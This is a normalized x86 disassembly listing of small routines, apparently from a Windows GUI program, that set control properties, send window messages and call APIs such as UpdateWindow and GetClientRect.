sub_43a69c
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43b724
sub_43a6c0
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43b724
sub_43a6e4
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43b724
sub_43a72c
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43a734
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43b724
sub_43a758
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43b724
sub_43a798
push ebx
mov ebx eax
call sub_437718
cmp ebx eax
sete al
pop ebx
retn
sub_43a7d0
push esi
mov dl 0x1
mov si 0xffce
call sub_403394
pop esi
retn
sub_43a91a
jmp sub_4038ec
sub_43a921
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43aa44
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43a9b8
retn
sub_43aa98
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43aaac
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_43ab91
jmp sub_4038ec
sub_43abb0
xor eax eax
retn
sub_43abb4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43abcc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43abe4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43ac00
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43ac18
retn
sub_43acdc
retn
sub_43ace0
cmp eax [ rw-data ]
sete al
retn
sub_43ad54
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43ae70
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403394
pop esi
pop ebp
retn 0x4
sub_43aeb0
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43b147
jmp sub_4038ec
sub_43b14e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b158
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403394
pop esi
retn
sub_43b16c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403394
pop esi
retn
sub_43b43b
jmp sub_4038ec
sub_43b4e4
push esi
mov si 0xffee
call sub_403394
pop esi
retn
sub_43b4f0
mov al 0x1
retn
sub_43b7c8
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_439bc4
retn
sub_43b7ec
retn
sub_43ba05
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41736c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43ba20
mov al [ eax + 0x5e ]
xchg edx eax
call sub_4196a4
retn
sub_43bb18
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43c130
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43c138
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43c140
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43c1f8
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c218
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43a6c0
mov [ ebx + 0x9a ] 0x1
sub_43c270
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43a664
mov [ ebx + 0x56 ] 0x1
sub_43c294
mov [ edx + 0xc ] 0x1
retn
sub_43c29c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43b724
sub_43c2b4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43b724
sub_43c2cc
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43c532
jmp sub_4038ec
sub_43c539
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c564
mov eax [ r-xdata ]
retn
sub_43c700
jmp sub_4038ec
sub_43c707
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c828
mov eax [ eax + 0xb8 ]
retn
sub_43c890
push ebx
mov ebx eax
mov eax ebx
call sub_43abb4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43c8ac
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43ca44
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43ca74
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43ca7c
call sub_439630
retn
sub_43cb7c
jmp sub_4038ec
sub_43cd3c
jmp sub_4038ec
sub_43cd8c
jmp sub_4038ec
sub_43cdc4
retn
sub_43d04d
jmp sub_4038ec
sub_43d1d5
jmp sub_4038ec
sub_43d537
jmp sub_4038ec
sub_43d5e3
jmp sub_4038ec
sub_43d5f0
inc [ eax + 0x160 ]
retn
sub_43d5f8
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43d618
sub_43d618
xor edx edx
call sub_43d55c
retn
sub_43d6e5
jmp sub_4038ec
sub_43d6ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d7db
jmp sub_4038ec
sub_43dd02
jmp sub_4038ec
sub_43dd09
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ded1
jmp sub_4038ec
sub_43ded8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dfac
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_43e199
jmp sub_4038ec
sub_43e1a0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_43e290
xor eax eax
retn
sub_43e2f8
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43b724
sub_43e426
jmp sub_403638
sub_43e55b
jmp sub_4038ec
sub_43e562
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403638#9
jmp sub_403638
sub_43e571
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a544
call sub_4039a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43eb2c
jmp sub_4038ec
sub_43eb33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43eb3c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_43f03a
jmp sub_4038ec
sub_43f08c
push ebx
mov ebx eax
call sub_41c478
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43b724
pop ebx
retn
sub_43f0a8
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43b724
retn
sub_43f0bc
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43b724
retn
sub_43f0cc
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43b724
retn
sub_43f378
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_441068
pop esi
retn
sub_43f48c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43f4dc
pop esi
retn
sub_43f4a0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43f5c8
pop esi
retn
sub_43f4b4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43f4c8
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43f5bb
jmp sub_4038ec
sub_43f5c2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f652
jmp sub_4038ec
sub_43f659
pop ebx
pop ecx
pop ebp
retn
sub_43f660
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_43f670
retn
sub_43f674
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_43f694
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_43f7f4
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_43f8c4
retn
sub_43f9dc
jmp sub_4038ec
sub_43f9e3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43faae
jmp sub_4038ec
sub_43fad8
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43fb6a
jmp sub_4038ec
sub_43fd3c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43ffe0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_4400bc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_43dae8
pop esi
retn
sub_440180
push esi
mov si 0xffc1
call sub_403394
pop esi
retn
sub_4401ac
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4401c0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4401d4
call sub_43daa8
retn
sub_4401dc
call sub_43daa8
retn
sub_4401e4
call sub_43daa8
retn
sub_44028c
push ebx
mov ebx eax
mov eax ebx
call sub_43c140
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41d618
mov dx 0xb009
mov eax ebx
call sub_43dae8
pop ebx
retn
sub_4403f0
call sub_43daa8
retn
sub_4403f8
call sub_43daa8
retn
sub_440400
call sub_43daa8
retn
sub_440408
call sub_43daa8
retn
sub_44046c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_440902
jmp sub_4038ec
sub_440909
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4409e8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_440b8c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43b724
retn
sub_440c2c
push ebx
mov ebx eax
mov eax ebx
call sub_44105c
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_440c48
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_440e20
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_440d58
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_440e78
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43b724
sub_440e98
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43b724
sub_440ebc
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_440ec8
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43b724
sub_440f74
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_440f18
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_441050
jmp sub_4038ec
sub_441057
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441276
jmp sub_4038ec
sub_44127d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441384
call sub_43b4f4
retn
sub_4417d2
jmp sub_4038ec
sub_441868
mov eax [ r-xdata ]
retn
sub_4419cf
jmp sub_4038ec
sub_441d62
jmp sub_4038ec
sub_441ea4
test [ eax + 0x52 ] 0x4
setne al
retn
sub_442000
jmp sub_4038ec
sub_442007
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41dc58
retn
sub_442023
jmp sub_4038ec
sub_442030
retn
sub_442104
mov [ edx + 0xc ] 0xffffffff
retn
sub_442162
jmp sub_4038ec
sub_442169
pop ecx
pop ecx
pop ebp
retn
sub_442209
jmp sub_4038ec
sub_442210
pop ebx
mov esp ebp
pop ebp
retn
sub_44227c
call sub_43e2b0
retn
sub_44230f
jmp sub_4038ec
sub_442316
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_4424f5
jmp sub_4038ec
sub_4424fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442658
push ebx
mov ebx eax
mov eax ebx
call sub_447604
or edx 0xffffffff
mov eax ebx
call sub_442784
pop ebx
retn
sub_442730
jmp sub_4038ec
sub_442784
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_442670
sub_4428f4
push ebx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_44290c
push ebx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_4429f8
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_43eee8
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_442a93
jmp sub_4038ec
sub_442a9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442abd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41dc58
retn
sub_442ab6
jmp sub_4038ec
sub_442abd
pop ebx
pop ecx
pop ebp
retn
sub_442ac4
retn
sub_442b2c
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_442e99
jmp sub_4038ec
sub_443080
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_44326c
jmp sub_4038ec
sub_44331c
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_443330
inc [ eax + 0x6c ]
retn
sub_443334
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_444bb4
sub_443494
call sub_443b94
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_443e3f
jmp sub_4038ec
sub_443e46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e63
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_443e5c
jmp sub_4038ec
sub_443e63
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444144
jmp sub_4038ec
sub_44414b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444168
mov eax [ ebp - 0x4 ]
call sub_41dc58
retn
sub_444161
jmp sub_4038ec
sub_444168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444185
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_44417e
jmp sub_4038ec
sub_444185
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444639
jmp sub_4038ec
sub_444640
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4447cb
jmp sub_4038ec
sub_4447d2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444887
jmp sub_4038ec
sub_44488e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44497c
jmp sub_4038ec
sub_4449cd
jmp sub_4038ec
sub_4449d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444a90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4433a0
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_444bdc
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_442edc
sub_4454dc
jmp sub_4038ec
sub_4454e3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4455ac
call GetCapture
retn
sub_4455b4
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40ceec
pop ebx
retn
sub_4455c4
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44582a
jmp sub_4038ec
sub_445a24
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_445c38
jmp sub_4038ec
sub_445c3f
pop ebx
mov esp ebp
pop ebp
retn
sub_445ceb
jmp sub_4038ec
sub_445cf2
pop ebp
retn
sub_445d7a
jmp sub_4038ec
sub_445d81
pop ebp
retn
sub_4461dd
xor eax [ eax ]
hlt
sub_446401
xor eax [ eax ]
hlt
sub_4464d0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4140f4
retn
sub_4464e8
mov al 0x1
retn
sub_4464ec
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_419e80
retn
mov eax edx
retn
sub_4464fc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_419e50
retn
mov al 0x1
retn
sub_4467ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414098
pop esi
pop ebx
retn
sub_446800
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44683c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_446aa0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446ab4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446ac8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446adc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446af0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446b04
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446b18
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446b2c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446b40
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446b54
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop ebx
retn
sub_446b68
retn
sub_446b6c
retn
sub_446b70
retn
sub_446b74
retn
sub_446b78
retn
sub_446b7c
retn
sub_446b80
retn
sub_446b84
retn
sub_446b88
retn
sub_446b8c
retn
sub_446b90
retn
sub_446b94
retn
sub_446e40
jmp sub_4038ec
sub_4471dc
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x90 ] eax
sub_447204
push esi
mov si 0xffef
call sub_403394
pop esi
retn
sub_4472a5
jmp sub_4038ec
sub_4472ac
pop ebp
retn
sub_4472b0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
sub_447311
xor eax [ eax ]
hlt
sub_4474d8
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_4476b1
jmp sub_4038ec
sub_4476b8
pop ebx
pop ecx
pop ebp
retn
sub_4476bc
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_4476c4
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44792c
sub_447771
jmp sub_4038ec
sub_447778
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403198
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_447880
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_4479bf
jmp sub_4038ec
sub_4479c6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447a5e
jmp sub_4038ec
sub_447a65
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447a82
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub_447a7b
jmp sub_4038ec
sub_447a82
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403394
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b59
jmp sub_4038ec
sub_447b97
jmp sub_4038ec
sub_447b9e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403394
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447d63
jmp sub_4038ec
sub_447d6a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447d87
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub_447d80
jmp sub_4038ec
sub_447d87
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447e00
retn
sub_447da0
jmp sub_4038ec
sub_447def
jmp sub_4038ec
sub_447df6
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447e7f
jmp sub_4038ec
sub_447e86
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447e8c
or edx 0xffffffff
call sub_447e00
retn
sub_44829b
jmp sub_4038ec
sub_4482a2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482bf
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub_4482b8
jmp sub_4038ec
sub_4482bf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482dc
mov eax [ ebp - 0x4 ]
call sub_448dd4
retn
sub_4482d5
jmp sub_4038ec
sub_4482dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4484e0
jmp sub_4038ec
sub_4484e7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4484ec
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403394
sub_448504
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412bb8
pop ebx
retn
sub_4485a8
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413eec
sub_4486bf
jmp sub_4038ec
sub_4486c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403198
retn
sub_4486dc
jmp sub_4038ec
sub_4489ee
jmp sub_4038ec
sub_4489f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448a12
mov eax [ ebp - 0x10 ]
call sub_403198
retn
sub_448a0b
jmp sub_4038ec
sub_448a12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448a2f
mov eax [ ebp - 0x8 ]
call sub_403198
retn
sub_448a28
jmp sub_4038ec
sub_448a2f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448a98
jmp sub_4038ec
sub_448bb1
jmp sub_4038ec
sub_448bce
jmp sub_4038ec
sub_448d86
jmp sub_4038ec
sub_448d8d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448dd0
inc [ eax + 0x5c ]
retn
sub_448dd4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403394
sub_448e28
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
